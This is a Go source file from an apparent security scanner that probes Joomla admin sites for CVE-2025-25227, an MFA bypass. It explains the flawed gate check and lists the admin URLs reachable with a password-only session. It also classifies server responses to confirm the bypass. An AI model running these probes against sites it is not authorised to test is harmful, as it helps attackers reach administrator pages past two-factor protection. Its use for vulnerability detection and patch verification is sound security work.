// CVE-2025-25227 - Joomla MFA bypass via captive-gate confusion.
//
// Affected: Joomla 4.0.0 - 4.4.12, 5.0.0 - 5.2.5.
// Fixed:    4.4.13 and 5.2.6 (2025-04-08).
// CWE-287, CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N).
//
// ROOT CAUSE
//
// MultiFactorAuthenticationHandler::needsMultiFactorAuthenticationRedirection()
// has an early-exit that short-circuits the captive redirect when the
// request is "already on an MFA page". In vulnerable versions that check
// was:
//
//	if ($this->isMultiFactorAuthenticationPage()) { return false; }
//
// - with NO argument. `isMultiFactorAuthenticationPage(false)` returns true
// not just for the captive page but for ALL com_users MFA management pages:
//
//	view = captive | method | methods | callback
//	task = captive.display | captive.captive | captive.validate
//	     | methods.display
//	     | method.display | method.add | method.edit | method.save
//	     | method.regenerateBackupCodes | method.delete
//	     | methods.disable | methods.doNotShowThisAgain
//
// A half-authed session (password OK, MFA not yet passed,
// com_users.mfa_checked = 0) navigating to any of those views or tasks
// passes the early-exit and dispatches WITHOUT solving the MFA challenge.
//
// The patch computes $onlyCaptive = isMultiFactorAuthenticationPending()
// && !$isMFASetupMandatory and passes it to isMultiFactorAuthenticationPage,
// restricting the bypass-exempt list to just captive.* + methods.display.
//
// EXPLOIT PRIMITIVE
//
// GET /administrator/index.php?option=com_users&view=methods with the
// half-authed session cookie. On vulnerable: HTTP 200 with the methods
// management page. On patched: HTTP 307/302 back to view=captive.
//
// This module is read-only. It does not mutate any admin state - it only
// issues GETs against bypass-candidate URLs to detect the vulnerability.
package mfa

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/rvzsec/joombrute/internal/httpx"
)

// BypassResult is the verdict of one bypass probe.
type BypassResult struct {
	// Vulnerable is true when at least one probe URL returned the
	// expected "bypassed-the-gate" signal.
	Vulnerable bool
	// Evidence is a short human-readable explanation, suitable for a
	// finding write-up.
	Evidence string
	// ExploitURL is the URL that proved the bypass when Vulnerable=true.
	ExploitURL string
	// AllProbes lists every URL we tried and the outcome of each, for
	// operator triage. Never logged to stdout unless --debug.
	AllProbes []ProbeAttempt
}

// ProbeAttempt is one URL we tried during the bypass scan.
type ProbeAttempt struct {
	URL      string
	Status   int
	Location string
	Verdict  string // "vulnerable" | "patched" | "ambiguous"
	BodyHint string
}

// bypassCandidates is the ordered list of URLs we probe. They mirror the
// allowed-list entries that the vulnerable isMultiFactorAuthenticationPage
// would let through. We probe in priority order: most reliable signal first.
//
// Each entry is appended to <admin-base>/index.php.
var bypassCandidates = []string{
	// view=methods - the canonical bypass surface used in the disclosure.
	// Renders the MFA methods management page on vulnerable systems.
	"?option=com_users&view=methods",
	// view=method - singular form, same allowed list.
	"?option=com_users&view=method",
	// view=callback - used by WebAuthn/passkey flows, on the allowed list.
	"?option=com_users&view=callback",
	// task=method.add - the "add a new MFA method" UI, on the allowed list
	// only when $onlyCaptive=false (the vulnerable case).
	"?option=com_users&task=method.add",
	// task=methods.doNotShowThisAgain - sets a profile flag but its
	// dispatch still passes the vulnerable gate.
	"?option=com_users&task=methods.doNotShowThisAgain",
}

// ProbeCVE2025_25227 walks the bypass candidate URLs against a half-
// authed session. client MUST hold the post-password session cookie AND
// MUST be configured with FollowRedirects=false so we see the 307 back
// to captive that patched systems emit.
func ProbeCVE2025_25227(ctx context.Context, client *http.Client, adminBaseURL, captiveURL string) (BypassResult, error) {
	if client == nil {
		return BypassResult{}, fmt.Errorf("nil client")
	}
	if adminBaseURL == "" {
		return BypassResult{}, fmt.Errorf("admin base URL required")
	}

	// Sanity: confirm captive is the current session state. If MFA was
	// already cleared, any 200 we get below isn't a bypass - it's a
	// regular admin response. This avoids reporting a false positive on
	// a fully-authed session.
	if captiveURL != "" {
		if ok, err := sessionIsCaptive(ctx, client, captiveURL); err != nil {
			return BypassResult{}, fmt.Errorf("captive sanity: %w", err)
		} else if !ok {
			return BypassResult{
				Evidence: "session not in captive state - supply a fresh post-password session",
			}, nil
		}
	}

	base := strings.TrimRight(adminBaseURL, "/") + "/index.php"
	res := BypassResult{}

	for _, suffix := range bypassCandidates {
		probeURL := base + suffix
		attempt := tryBypass(ctx, client, probeURL)
		res.AllProbes = append(res.AllProbes, attempt)

		if attempt.Verdict == "vulnerable" {
			res.Vulnerable = true
			res.ExploitURL = attempt.URL
			res.Evidence = fmt.Sprintf(
				"CVE-2025-25227: %s returned HTTP %d (%s) without captive redirect - MFA gate bypassed",
				attempt.URL, attempt.Status, attempt.BodyHint)
			return res, nil
		}
	}

	// No candidate triggered. Summarize the patched verdict using the
	// first probe's evidence (they're all variations on the same gate).
	if len(res.AllProbes) > 0 {
		first := res.AllProbes[0]
		res.Evidence = fmt.Sprintf(
			"all %d bypass candidates redirected back to captive (first: HTTP %d -> %s) - target appears patched",
			len(res.AllProbes), first.Status, first.Location)
	} else {
		res.Evidence = "no bypass candidates were tested"
	}
	return res, nil
}

// tryBypass GETs one bypass-candidate URL and classifies the response.
//
// Vulnerable signal: HTTP 200 with a body that looks like com_users MFA
// content (methods list, MFA management heading, etc.) - i.e. the
// dispatcher ran the controller without redirecting through captive.
//
// Patched signal: HTTP 3xx whose Location header points back to
// view=captive.
//
// Ambiguous: anything else (session likely stale, 4xx, etc.).
func tryBypass(ctx context.Context, client *http.Client, probeURL string) ProbeAttempt {
	att := ProbeAttempt{URL: probeURL}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
	if err != nil {
		att.Verdict = "ambiguous"
		att.BodyHint = "req-build: " + err.Error()
		return att
	}
	httpx.SetUA(req, "")
	resp, err := client.Do(req)
	if err != nil {
		att.Verdict = "ambiguous"
		att.BodyHint = "transport: " + err.Error()
		return att
	}
	defer resp.Body.Close()

	att.Status = resp.StatusCode
	att.Location = resp.Header.Get("Location")

	switch {
	case resp.StatusCode >= 300 && resp.StatusCode < 400:
		low := strings.ToLower(att.Location)
		switch {
		// Redirect back to captive = the gate fired = patched.
		case strings.Contains(low, "view=captive"):
			att.Verdict = "patched"
			att.BodyHint = "redirected to captive"
		// Redirect to login (option=com_login or similar) = session
		// expired or got nuked. Ambiguous - can't conclude.
		case strings.Contains(low, "option=com_login"),
			strings.Contains(low, "task=login"):
			att.Verdict = "ambiguous"
			att.BodyHint = "session lost - redirected to login"
		// Redirect to ANYTHING inside /administrator/ that isn't captive
		// means the dispatcher chose a non-captive next step - that's
		// the bypass signal at the redirect layer.
		case strings.Contains(low, "/administrator/"):
			att.Verdict = "vulnerable"
			att.BodyHint = "redirected past captive to " + att.Location
		default:
			att.Verdict = "ambiguous"
			att.BodyHint = "unclassified redirect"
		}
		return att

	case resp.StatusCode == http.StatusOK:
		buf, _ := io.ReadAll(io.LimitReader(resp.Body, 96*1024))
		low := strings.ToLower(string(buf))

		// Negative-first: if the body IS the captive page, the gate
		// fired anyway and returned 200 instead of redirecting.
		if strings.Contains(low, "captive-form") ||
			strings.Contains(low, "task=captive.validate") {
			att.Verdict = "patched"
			att.BodyHint = "captive form rendered inline"
			return att
		}
		// Login form re-rendered = session lost.
		if strings.Contains(low, `id="form-login"`) ||
			strings.Contains(low, `id="mod-login-username"`) {
			att.Verdict = "ambiguous"
			att.BodyHint = "login form re-rendered - session may have expired"
			return att
		}
		// Positive: com_users management content rendered without going
		// through captive. The MFA methods view emits a #user-mfa
		// container or links to method.add / methods.delete.
		switch {
		case strings.Contains(low, "user-mfa-methods-list"),
			strings.Contains(low, "method.add"),
			strings.Contains(low, "task=methods.add"),
			strings.Contains(low, "com_users.methods"),
			strings.Contains(low, "two-factor-authentication") && !strings.Contains(low, "captive-form"),
			strings.Contains(low, "multi-factor authentication"):
			att.Verdict = "vulnerable"
			att.BodyHint = "MFA methods management page rendered without captive"
			return att
		case strings.Contains(low, `id="cpanel"`),
			strings.Contains(low, "option=com_cpanel"):
			att.Verdict = "vulnerable"
			att.BodyHint = "control panel rendered without captive"
			return att
		}
		att.Verdict = "ambiguous"
		att.BodyHint = "HTTP 200 with unclassified body"
		return att

	case resp.StatusCode == http.StatusForbidden,
		resp.StatusCode == http.StatusUnauthorized:
		att.Verdict = "patched"
		att.BodyHint = fmt.Sprintf("HTTP %d", resp.StatusCode)
		return att

	default:
		att.Verdict = "ambiguous"
		att.BodyHint = fmt.Sprintf("HTTP %d", resp.StatusCode)
		return att
	}
}

// sessionIsCaptive GETs captiveURL and verifies the response looks like
// the captive page rather than a redirect away from it. Used as a
// pre-flight to avoid reporting bypass on a session that already passed MFA.
func sessionIsCaptive(ctx context.Context, client *http.Client, captiveURL string) (bool, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, captiveURL, nil)
	if err != nil {
		return false, err
	}
	httpx.SetUA(req, "")
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		loc := strings.ToLower(resp.Header.Get("Location"))
		// Redirected away from captive => not in captive state.
		if !strings.Contains(loc, "captive") && !strings.Contains(loc, "view=methods") {
			return false, nil
		}
		return true, nil
	}
	if resp.StatusCode != http.StatusOK {
		return false, nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	low := strings.ToLower(string(body))
	return strings.Contains(low, "captive-form") ||
		strings.Contains(low, "task=captive.validate") ||
		strings.Contains(low, "two-factor"), nil
}


